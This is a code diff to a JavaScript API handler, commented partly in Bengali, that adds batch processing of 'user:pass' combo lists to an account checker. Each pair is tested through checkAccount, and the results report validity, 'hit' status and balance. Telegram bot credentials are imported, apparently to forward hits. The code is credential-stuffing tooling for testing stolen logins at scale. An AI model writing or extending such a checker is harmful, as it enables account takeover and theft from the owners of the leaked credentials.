@@ -1,4 +1,4 @@
-// api/check.js
+// api/check.js – supports batch checking
 import { checkAccount } from '../lib/checkCore.js';
 import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/config.js';
 
@@ -7,8 +7,9 @@ export default async function handler(req, res) {
     return res.status(405).json({ error: 'Method not allowed' });
   }
 
-  const { username, password, testOnly } = req.body;
+  const { username, password, combos, testOnly } = req.body;
 
+  // Test mode
   if (testOnly) {
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
       return res.status(200).json({ success: false, error: 'Bot token or chat ID missing' });
@@ -36,6 +37,23 @@ export default async function handler(req, res) {
     }
   }
 
+  // ===== BATCH CHECK =====
+  // যদি combos অ্যারে পাঠানো হয়
+  if (combos && Array.isArray(combos) && combos.length > 0) {
+    const results = [];
+    for (const combo of combos) {
+      const [user, pass] = combo.split(':');
+      if (!user || !pass) {
+        results.push({ combo, valid: false, hit: false, balance: 0, message: 'Invalid format' });
+        continue;
+      }
+      const result = await checkAccount(user.trim(), pass.trim());
+      results.push({ combo, ...result });
+    }
+    return res.status(200).json({ results });
+  }
+
+  // SINGLE CHECK (পুরনো পদ্ধতি)
   if (!username || !password) {
     return res.status(400).json({ error: 'Missing username or password' });
   }
@@ -64,10 +82,5 @@ export default async function handler(req, res) {
     } catch (err) {}
   }
 
-  return res.status(200).json({
-    valid: result.valid,
-    hit: result.hit,
-    balance: result.balance,
-    message: result.message
-  });
+  return res.status(200).json(result);
 }
